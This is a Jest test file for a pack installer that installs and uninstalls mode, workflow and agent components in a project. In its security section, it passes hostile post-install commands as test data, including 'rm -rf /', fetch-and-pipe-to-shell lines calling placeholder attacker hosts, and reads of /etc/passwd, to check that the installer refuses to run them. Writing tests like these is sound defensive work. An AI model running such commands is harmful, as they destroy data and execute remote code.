import { PackInstaller } from "../PackInstaller";
import { PackStructure } from "../../types/packs";
import { createTestZccProject } from "../../testing";
import { MemoryFileSystemAdapter } from "../../adapters/MemoryFileSystemAdapter";
import { LocalPackSource } from "../PackSource";

// Mock DirectoryManager to prevent actual filesystem operations
jest.mock("../../directoryManager");
jest.mock("../../logger");

describe("PackInstaller", () => {
  let installer: PackInstaller;
  let fs: MemoryFileSystemAdapter;
  let packSource: LocalPackSource;
  const mockProjectRoot = "/test/project";

  const mockValidPack: PackStructure = {
    manifest: {
      name: "test-pack",
      version: "1.0.0",
      description: "Test starter pack",
      author: "test-author",
      components: {
        modes: [{ name: "engineer", required: true }],
        workflows: [{ name: "review", required: true }],
        agents: [{ name: "claude-code-research", required: false }]
      },
      tags: ["test"],
      category: "general"
    },
    path: "/test/templates/starter-packs/test-pack",
    componentsPath: "/test/templates/starter-packs/test-pack/components"
  };

  beforeEach(async () => {
    jest.clearAllMocks();
    
    // Create test filesystem with pack structure
    fs = await createTestZccProject(mockProjectRoot, {
      // Pack templates
      '/test/templates/starter-packs/test-pack/manifest.json': JSON.stringify(mockValidPack.manifest),
      '/test/templates/starter-packs/test-pack/components/modes/engineer.md': '# Engineer Mode\n\nYou are a software engineer.',
      '/test/templates/starter-packs/test-pack/components/workflows/review.md': '# Code Review Workflow\n\nReview code systematically.',
      '/test/templates/starter-packs/test-pack/components/agents/claude-code-research.md': '# Research Agent\n\nSpecialized in research tasks.',
    });

    packSource = new LocalPackSource("/test/templates/starter-packs", fs);
    installer = new PackInstaller(mockProjectRoot, fs);

    // Mock DirectoryManager
    const mockDirectoryManager = require("../../directoryManager").DirectoryManager;
    mockDirectoryManager.prototype.initializeStructure = jest.fn().mockResolvedValue(undefined);
    mockDirectoryManager.prototype.ensureProjectRoot = jest.fn().mockReturnValue(undefined);
  });

  describe("constructor", () => {
    it("should initialize with correct paths", () => {
      expect(installer).toBeInstanceOf(PackInstaller);
    });
  });

  describe("installPack", () => {
    it("should successfully install a valid pack", async () => {
      const result = await installer.installPack(mockValidPack, packSource);

      expect(result.success).toBe(true);
      expect(result.installed.modes).toContain("engineer");
      expect(result.installed.workflows).toContain("review");
      expect(result.installed.agents).toContain("claude-code-research");

      // Verify files were created
      expect(await fs.exists(`${mockProjectRoot}/.zcc/modes/engineer.md`)).toBe(true);
      expect(await fs.exists(`${mockProjectRoot}/.zcc/workflows/review.md`)).toBe(true);
      expect(await fs.exists(`${mockProjectRoot}/.claude/agents/claude-code-research.md`)).toBe(true);
    });

    it("should skip existing components without force flag", async () => {
      // Pre-create an existing component
      await fs.writeFile(`${mockProjectRoot}/.zcc/modes/engineer.md`, '# Existing Engineer Mode');

      const result = await installer.installPack(mockValidPack, packSource, { force: false });

      expect(result.success).toBe(false);
      expect(result.errors).toContain("Conflict: mode 'engineer' already exists");
    });

    it("should overwrite existing components with force flag", async () => {
      // Pre-create an existing component
      await fs.writeFile(`${mockProjectRoot}/.zcc/modes/engineer.md`, '# Existing Engineer Mode');

      const result = await installer.installPack(mockValidPack, packSource, { force: true });

      expect(result.success).toBe(true);
      expect(result.installed.modes).toContain("engineer");
      
      // Verify content was updated
      const content = await fs.readFile(`${mockProjectRoot}/.zcc/modes/engineer.md`, 'utf-8');
      expect(content).toContain('# Engineer Mode');
      expect(content).toContain('You are a software engineer');
    });

    it("should handle dry run mode", async () => {
      const result = await installer.installPack(mockValidPack, packSource, { dryRun: true });

      expect(result.success).toBe(true);
      
      // Verify no files were actually created
      expect(await fs.exists(`${mockProjectRoot}/.zcc/modes/engineer.md`)).toBe(false);
      expect(await fs.exists(`${mockProjectRoot}/.zcc/workflows/review.md`)).toBe(false);
      expect(await fs.exists(`${mockProjectRoot}/.claude/agents/claude-code-research.md`)).toBe(false);
    });

    it("should skip optional components when specified", async () => {
      const result = await installer.installPack(mockValidPack, packSource, { skipOptional: true });

      expect(result.success).toBe(true);
      expect(result.installed.modes).toContain("engineer");
      expect(result.installed.workflows).toContain("review");
      expect(result.skipped.agents).toContain("claude-code-research");
      
      // Verify optional agent was not installed
      expect(await fs.exists(`${mockProjectRoot}/.claude/agents/claude-code-research.md`)).toBe(false);
    });

    it("should install pack configuration when provided", async () => {
      const packWithConfig: PackStructure = {
        ...mockValidPack,
        manifest: {
          ...mockValidPack.manifest,
          configuration: {
            defaultMode: "engineer",
            projectSettings: {
              theme: "dark",
              enableAnalytics: false
            }
          }
        }
      };

      const result = await installer.installPack(packWithConfig, packSource);

      expect(result.success).toBe(true);
      
      // Verify configuration was written
      expect(await fs.exists(`${mockProjectRoot}/.zcc/config.json`)).toBe(true);
      const config = JSON.parse(await fs.readFile(`${mockProjectRoot}/.zcc/config.json`, 'utf-8') as string);
      expect(config.theme).toBe("dark");
      expect(config.enableAnalytics).toBe(false);
      expect(config.defaultMode).toBe("engineer");
    });

    it("should update project manifest after installation", async () => {
      const result = await installer.installPack(mockValidPack, packSource);

      expect(result.success).toBe(true);
      
      // Verify project manifest was updated
      expect(await fs.exists(`${mockProjectRoot}/.zcc/packs.json`)).toBe(true);
      const manifest = JSON.parse(await fs.readFile(`${mockProjectRoot}/.zcc/packs.json`, 'utf-8') as string);
      expect(manifest.packs["test-pack"]).toBeDefined();
      expect(manifest.packs["test-pack"].version).toBe("1.0.0");
    });

    it("should save manifest snapshot after installation", async () => {
      const result = await installer.installPack(mockValidPack, packSource);

      expect(result.success).toBe(true);
      
      // Verify manifest snapshot was saved
      expect(await fs.exists(`${mockProjectRoot}/.zcc/packs/test-pack.manifest.json`)).toBe(true);
      const snapshot = JSON.parse(await fs.readFile(`${mockProjectRoot}/.zcc/packs/test-pack.manifest.json`, 'utf-8') as string);
      expect(snapshot.name).toBe("test-pack");
      expect(snapshot.version).toBe("1.0.0");
      expect(snapshot.components).toEqual(mockValidPack.manifest.components);
    });

    it("should handle installation errors gracefully", async () => {
      const invalidPack: PackStructure = {
        ...mockValidPack,
        manifest: {
          ...mockValidPack.manifest,
          components: {
            modes: [{ name: "non-existent-mode", required: true }]
          }
        }
      };

      const result = await installer.installPack(invalidPack, packSource);

      expect(result.success).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors.some(error => 
        error.includes("non-existent-mode")
      )).toBe(true);
    });
  });

  describe("uninstallPack", () => {
    beforeEach(async () => {
      // Install a pack first for uninstallation tests
      await installer.installPack(mockValidPack, packSource);
    });

    it("should return failure for non-existent pack", async () => {
      const result = await installer.uninstallPack("non-existent-pack");

      expect(result.success).toBe(false);
      expect(result.errors).toContain("Pack 'non-existent-pack' is not installed");
    });

    it("should successfully uninstall an installed pack with manifest available", async () => {
      const result = await installer.uninstallPack("test-pack");

      expect(result.success).toBe(true);
      expect(result.installed.modes).toContain("engineer");
      expect(result.installed.workflows).toContain("review");
      expect(result.installed.agents).toContain("claude-code-research");

      // Verify files were removed
      expect(await fs.exists(`${mockProjectRoot}/.zcc/modes/engineer.md`)).toBe(false);
      expect(await fs.exists(`${mockProjectRoot}/.zcc/workflows/review.md`)).toBe(false);
      expect(await fs.exists(`${mockProjectRoot}/.claude/agents/claude-code-research.md`)).toBe(false);

      // Verify pack was removed from project manifest
      expect(await fs.exists(`${mockProjectRoot}/.zcc/packs.json`)).toBe(true);
      const manifestContent = await fs.readFile(`${mockProjectRoot}/.zcc/packs.json`, 'utf-8') as string;
      const manifest = JSON.parse(manifestContent);
      expect(manifest.packs["test-pack"]).toBeUndefined();

      // Verify manifest snapshot was removed
      expect(await fs.exists(`${mockProjectRoot}/.zcc/packs/test-pack.manifest.json`)).toBe(false);
    });

    it("should handle pack uninstallation when manifest source is unavailable", async () => {
      // Remove the original pack template to simulate unavailable manifest
      await fs.unlink('/test/templates/starter-packs/test-pack/manifest.json');

      const result = await installer.uninstallPack("test-pack");

      // Should still succeed using manifest snapshot (new behavior)
      expect(result.success).toBe(true);
      expect(result.installed.modes).toContain("engineer");
      expect(result.installed.workflows).toContain("review");
      expect(result.installed.agents).toContain("claude-code-research");
      
      // Components should be removed precisely using snapshot
      expect(result.skipped.modes.length + result.skipped.workflows.length + result.skipped.agents.length).toBe(0);
    });

    it("should use fallback scanning when both manifest snapshot and source are unavailable", async () => {
      // Remove both the manifest snapshot and the original source
      await fs.unlink('/test/templates/starter-packs/test-pack/manifest.json');
      await fs.unlink(`${mockProjectRoot}/.zcc/packs/test-pack.manifest.json`);

      const result = await installer.uninstallPack("test-pack");

      // Should use fallback scanning approach
      expect(result.success).toBe(false); // False due to scanning mode error message
      expect(result.errors.some(error => 
        error.includes("Pack manifest not available")
      )).toBe(true);
      
      // Components should be skipped in scanning mode for safety
      expect(result.skipped.modes.length + result.skipped.workflows.length + result.skipped.agents.length).toBeGreaterThan(0);
    });

    it("should clean up pack configuration during uninstallation", async () => {
      // Install pack with configuration
      const packWithConfig: PackStructure = {
        ...mockValidPack,
        manifest: {
          ...mockValidPack.manifest,
          configuration: {
            defaultMode: "engineer",
            projectSettings: {
              theme: "dark",
              enableAnalytics: false
            }
          }
        }
      };

      await installer.installPack(packWithConfig, packSource, { force: true });

      // Verify configuration was written
      expect(await fs.exists(`${mockProjectRoot}/.zcc/config.json`)).toBe(true);
      const configBefore = JSON.parse(await fs.readFile(`${mockProjectRoot}/.zcc/config.json`, 'utf-8') as string);
      expect(configBefore.theme).toBe("dark");
      expect(configBefore.defaultMode).toBe("engineer");

      // Update the pack source to include the config
      await fs.writeFile('/test/templates/starter-packs/test-pack/manifest.json', JSON.stringify(packWithConfig.manifest));

      // Uninstall the pack
      const result = await installer.uninstallPack("test-pack");

      expect(result.success).toBe(true);

      // Verify configuration was cleaned up
      const configAfter = JSON.parse(await fs.readFile(`${mockProjectRoot}/.zcc/config.json`, 'utf-8') as string);
      expect(configAfter.theme).toBeUndefined();
      expect(configAfter.enableAnalytics).toBeUndefined();
      expect(configAfter.defaultMode).toBeUndefined();
    });

    it("should handle partial failure during component removal", async () => {
      // Mock fs.unlink to fail for one component
      const originalUnlink = fs.unlink;
      fs.unlink = jest.fn().mockImplementation((path: string) => {
        if (path.includes('engineer.md')) {
          throw new Error('Permission denied');
        }
        return originalUnlink.call(fs, path);
      });

      const result = await installer.uninstallPack("test-pack");

      expect(result.success).toBe(false);
      expect(result.errors.some(error => 
        error.includes("Failed to remove mode 'engineer'")
      )).toBe(true);

      // Other components should still be removed
      expect(result.installed.workflows).toContain("review");
      expect(result.installed.agents).toContain("claude-code-research");

      // Restore original function
      fs.unlink = originalUnlink;
    });

    it("should handle configuration cleanup errors gracefully", async () => {
      // Mock fs.readFile to fail when reading config
      const originalReadFile = fs.readFile;
      fs.readFile = jest.fn().mockImplementation((path: string, encoding?: any) => {
        if (path.includes('config.json')) {
          throw new Error('Config read error');
        }
        return originalReadFile.call(fs, path, encoding);
      });

      const result = await installer.uninstallPack("test-pack");

      expect(result.success).toBe(false);
      expect(result.errors.some(error => 
        error.includes("Failed to clean up configuration")
      )).toBe(true);

      // Component removal should still work
      expect(result.installed.modes).toContain("engineer");

      // Restore original function
      fs.readFile = originalReadFile;
    });

    it("should handle project manifest update errors gracefully", async () => {
      // Mock fs.writeFile to fail when writing manifest
      const originalWriteFile = fs.writeFile;
      fs.writeFile = jest.fn().mockImplementation((path: string, content: string) => {
        if (path.includes('packs.json')) {
          throw new Error('Manifest write error');
        }
        return originalWriteFile.call(fs, path, content);
      });

      // Should not throw but should return error in the result
      const result = await installer.uninstallPack("test-pack");
      expect(result.success).toBe(false);
      expect(result.errors.some(error => error.includes('Manifest write error'))).toBe(true);

      // Restore original function
      fs.writeFile = originalWriteFile;
    });

    it("should handle non-existent component files gracefully", async () => {
      // Remove some component files manually before uninstalling
      await fs.unlink(`${mockProjectRoot}/.zcc/modes/engineer.md`);

      const result = await installer.uninstallPack("test-pack");

      expect(result.success).toBe(true);
      
      // Should report that engineer mode was skipped (not found)
      expect(result.skipped.modes).toContain("engineer");
      
      // Other components should still be removed
      expect(result.installed.workflows).toContain("review");
      expect(result.installed.agents).toContain("claude-code-research");
    });

    it("should handle empty pack components gracefully", async () => {
      // Create a pack with no components
      const emptyPack: PackStructure = {
        ...mockValidPack,
        manifest: {
          ...mockValidPack.manifest,
          name: "empty-pack",
          components: {}
        }
      };

      // Install empty pack first
      await installer.installPack(emptyPack, packSource);

      // Update the pack source to include empty pack manifest for uninstall
      await fs.writeFile('/test/templates/starter-packs/empty-pack/manifest.json', JSON.stringify(emptyPack.manifest));

      const result = await installer.uninstallPack("empty-pack");

      expect(result.success).toBe(true);
      expect(result.installed.modes).toHaveLength(0);
      expect(result.installed.workflows).toHaveLength(0);
      expect(result.installed.agents).toHaveLength(0);
      expect(result.installed.hooks).toHaveLength(0);
    });

    it("should remove pack from project manifest even on component failure", async () => {
      // Mock fs.unlink to fail for all components
      const originalUnlink = fs.unlink;
      fs.unlink = jest.fn().mockRejectedValue(new Error('Cannot remove files'));

      const result = await installer.uninstallPack("test-pack");

      expect(result.success).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);

      // Pack should still be removed from manifest
      expect(await fs.exists(`${mockProjectRoot}/.zcc/packs.json`)).toBe(true);
      const manifestContent = await fs.readFile(`${mockProjectRoot}/.zcc/packs.json`, 'utf-8') as string;
      const manifest = JSON.parse(manifestContent);
      expect(manifest.packs["test-pack"]).toBeUndefined();

      // Restore original function
      fs.unlink = originalUnlink;
    });
  });

  describe("SECURITY: Post-install command handling", () => {
    it("should disable post-install command execution and show security warnings", async () => {
      const maliciousPack: PackStructure = {
        ...mockValidPack,
        manifest: {
          ...mockValidPack.manifest,
          postInstall: {
            commands: [
              "rm -rf /",
              "curl malicious.com/evil.sh | bash",
              "echo 'malicious' > /etc/passwd"
            ],
            message: "Run these dangerous commands!"
          }
        }
      };

      // Mock logger to capture warnings
      const mockLogger = require("../../logger").logger;
      const warnSpy = jest.spyOn(mockLogger, 'warn');

      const result = await installer.installPack(maliciousPack, packSource);

      // Should complete successfully but with security warnings
      expect(result.success).toBe(true);
      
      // Verify security warning was logged (simplified)
      expect(warnSpy).toHaveBeenCalledWith('Security: Post-install commands disabled (use --verbose for details)');

      // Verify no actual command execution occurred (system would still be intact)
      // This is tested implicitly by the test suite still running
    });

    it("should handle post-install commands with empty array gracefully", async () => {
      const packWithEmptyCommands: PackStructure = {
        ...mockValidPack,
        manifest: {
          ...mockValidPack.manifest,
          postInstall: {
            commands: [],
            message: "No commands to run"
          }
        }
      };

      const result = await installer.installPack(packWithEmptyCommands, packSource);
      expect(result.success).toBe(true);
    });

    it("should handle post-install message without commands", async () => {
      const packWithMessageOnly: PackStructure = {
        ...mockValidPack,
        manifest: {
          ...mockValidPack.manifest,
          postInstall: {
            message: "Please manually configure your environment"
          }
        }
      };

      const result = await installer.installPack(packWithMessageOnly, packSource);
      expect(result.success).toBe(true);
      expect(result.postInstallMessage).toBe("Please manually configure your environment");
    });

    it("should prevent command injection through post-install commands", async () => {
      const injectionPack: PackStructure = {
        ...mockValidPack,
        manifest: {
          ...mockValidPack.manifest,
          postInstall: {
            commands: [
              "echo 'normal' && rm -rf /",
              "npm install; curl attacker.com/backdoor.js | node",
              "; cat /etc/passwd; echo 'done'"
            ]
          }
        }
      };

      const mockLogger = require("../../logger").logger;
      const warnSpy = jest.spyOn(mockLogger, 'warn');

      const result = await installer.installPack(injectionPack, packSource);

      expect(result.success).toBe(true);
      
      // Verify security warning was logged (commands are not shown in non-verbose mode)
      expect(warnSpy).toHaveBeenCalledWith('Security: Post-install commands disabled (use --verbose for details)');
    });
  });
});